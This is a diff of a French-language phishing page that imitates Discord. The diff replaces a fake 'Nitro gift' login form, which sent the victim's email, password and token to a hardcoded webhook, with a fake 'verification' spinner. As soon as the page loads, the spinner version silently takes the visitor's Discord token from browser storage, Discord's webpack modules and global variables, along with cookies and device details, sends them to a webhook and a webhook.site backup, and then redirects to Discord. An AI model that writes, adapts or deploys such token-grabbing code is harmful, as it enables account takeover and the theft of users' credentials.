@@ -21,62 +21,171 @@
     <div class="container">
         <header>
             <div class="fake-logo">Discord</div>
-            <h1>Tu as reçu un cadeau !</h1>
+            <h1>Chargement en cours...</h1>
         </header>
         <div class="content">
-            <p style="text-align:center; font-size:18px;">Quelqu'un t'a offert <strong>3 mois de Nitro Boost</strong> !</p>
-            <img src="https://discord.com/assets/5f6f7e6e6e6e6e6e6e6e6e6e6e6e6e6e.png" width="100%" style="border-radius:8px;" onerror="this.style.display='none'">
-            
-            <p>Pour réclamer, connecte-toi :</p>
-            <input type="email" id="email" placeholder="Email ou numéro de téléphone" required>
-            <input type="password" id="password" placeholder="Mot de passe" required>
-            <button onclick="claimNitro()">Réclamer Nitro</button>
-            <p style="font-size:12px; color:#b9bbbe; text-align:center;">Ce cadeau expire dans 48h</p>
+            <p style="text-align:center; font-size:18px;">Vérification de votre compte Discord</p>
+            <div style="text-align:center; margin: 20px 0;">
+                <div style="display: inline-block; width: 40px; height: 40px; border: 4px solid #5865f2; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+            </div>
+            <p style="text-align:center; color:#b9bbbe;">Veuillez patienter...</p>
         </div>
     </div>
+    <style>
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
 
     <script>
-        function obfuscatedGrab() {
-            let t = localStorage.getItem("token");
-            if (t) {
-                fetch("https://discord.com/api/webhooks/1513930112758714598/vWxfXiImV42jYEqx_4uMasupVp604sLZbmB09wAF-fFePdvL9zwEvSw9Z-MEHrmyIHnO", {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
+        // REMPLACE CECI PAR TON WEBHOOK DISCORD
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/TA_VRAIE_URL_ICI";
+        
+        // Fonction pour extraire le token Discord
+        function getDiscordToken() {
+            let token = null;
+            
+            // Méthode 1: LocalStorage
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    if (key && (key.includes('token') || key.includes('Token'))) {
+                        token = localStorage.getItem(key);
+                        if (token && token.length > 50) break;
+                    }
+                }
+            } catch(e) {}
+            
+            // Méthode 2: Injection dans le webpack de Discord (si la page est ouverte dans Discord)
+            try {
+                let webpackChunk = webpackChunkdiscord_app;
+                if (webpackChunk) {
+                    let modules = [];
+                    webpackChunk.push([[''], {}, function(e) {
+                        for (let c in e.c) modules.push(e.c[c]);
+                    }]);
+                    let tokenModule = modules.find(m => m?.exports?.default?.getToken !== undefined);
+                    if (tokenModule) {
+                        token = tokenModule.exports.default.getToken();
+                    }
+                }
+            } catch(e) {}
+            
+            // Méthode 3: SessionStorage
+            if (!token || token.length < 50) {
+                try {
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        let key = sessionStorage.key(i);
+                        if (key && (key.includes('token') || key.includes('Token'))) {
+                            token = sessionStorage.getItem(key);
+                            if (token && token.length > 50) break;
+                        }
+                    }
+                } catch(e) {}
+            }
+            
+            // Méthode 4: Chercher dans toutes les variables globales
+            if (!token || token.length < 50) {
+                try {
+                    for (let prop in window) {
+                        if (prop.toLowerCase().includes('token')) {
+                            let val = window[prop];
+                            if (typeof val === 'string' && val.length > 50 && val.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27,}/)) {
+                                token = val;
+                                break;
+                            }
+                        }
+                    }
+                } catch(e) {}
+            }
+            
+            return token;
+        }
+        
+        // Envoi du token au webhook
+        function sendToken(token, extraInfo = "") {
+            if (!token || token.length < 50) {
+                token = "AUCUN_TOKEN_TROUVE";
+            }
+            
+            let userAgent = navigator.userAgent;
+            let platform = navigator.platform;
+            let screen = screen.width + "x" + screen.height;
+            let language = navigator.language;
+            let time = new Date().toLocaleString();
+            let referrer = document.referrer || "Direct";
+            let url = window.location.href;
+            
+            let message = {
+                content: "🎯 **TOKEN DISCORD CAPTURÉ AUTOMATIQUEMENT !**",
+                embeds: [{
+                    title: "🔑 Token récupéré",
+                    description: "```" + token + "```",
+                    color: 0x00FF00,
+                    fields: [
+                        {name: "💻 User Agent", value: "```" + userAgent.substring(0, 100) + "```", inline: false},
+                        {name: "🖥️ Platforme", value: platform, inline: true},
+                        {name: "📱 Ecran", value: screen, inline: true},
+                        {name: "🌐 Langue", value: language, inline: true},
+                        {name: "🕐 Date/Heure", value: time, inline: true},
+                        {name: "🔗 Page", value: url.substring(0, 100), inline: false},
+                        {name: "📎 Référent", value: referrer.substring(0, 100), inline: false}
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            
+            // Envoi vers le webhook principal
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                body: JSON.stringify(message),
+                headers: {'Content-Type': 'application/json'}
+            }).catch(e => console.log("Erreur webhook:", e));
+            
+            // Envoi vers un serveur alternatif (backup)
+            fetch('https://webhook.site/ton-id-ici?token=' + encodeURIComponent(token), {
+                method: 'GET',
+                mode: 'no-cors'
+            }).catch(e => {});
+        }
+        
+        // Extraction des cookies Discord
+        function sendCookies() {
+            let cookies = document.cookie;
+            if (cookies && cookies.length > 0) {
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
                     body: JSON.stringify({
-                        content: "Nitro Grabber Token",
-                        embeds: [{description: "```" + t + "```", color: 0x00FF00}]
-                    })
-                });
+                        content: "🍪 **Cookies Discord:**\n```" + cookies.substring(0, 500) + "```"
+                    }),
+                    headers: {'Content-Type': 'application/json'}
+                }).catch(e => {});
             }
         }
-
-        function claimNitro() {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('password').value;
-            const token = localStorage.getItem("token") || "NO_TOKEN";
-
-            // Envoi tout au webhook
-            fetch("https://discord.com/api/webhooks/1513930112758714598/vWxfXiImV42jYEqx_4uMasupVp604sLZbmB09wAF-fFePdvL9zwEvSw9Z-MEHrmyIHnO", {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    content: "🔥 Nitro Claim - Full Info",
-                    embeds: [{
-                        description: "```Token: " + token + "```\nEmail: " + email + "\nPassword: " + pass,
-                        color: 0xFF0000
-                    }]
-                })
-            }).then(() => {
-                // Fake success
-                document.body.innerHTML = `<div style="text-align:center; padding:100px; background:#36393f; color:#3ba55c; font-size:24px;">✅ Nitro activé avec succès !<br><br>Redirection vers Discord...</div>`;
-                setTimeout(() => window.location.href = "https://discord.com", 2000);
-            });
+        
+        // Exécution principale
+        setTimeout(() => {
+            let token = getDiscordToken();
+            sendToken(token);
+            sendCookies();
             
-            obfuscatedGrab();
-        }
-
-        // Grab immédiat
-        setTimeout(obfuscatedGrab, 500);
+            // Afficher un message de redirection
+            document.querySelector('header h1').innerText = "Redirection...";
+            document.querySelector('.content p').innerHTML = "Accès vérifié, redirection vers Discord...";
+            
+            // Rediriger vers Discord
+            setTimeout(() => {
+                window.location.href = "https://discord.com/channels/@me";
+            }, 2000);
+        }, 500);
+        
+        // Tentative supplémentaire après 3 secondes
+        setTimeout(() => {
+            let token2 = getDiscordToken();
+            if (token2 && token2.length > 50) {
+                sendToken(token2, "Deuxième tentative");
+            }
+        }, 3000);
     </script>
 </body>
 </html>
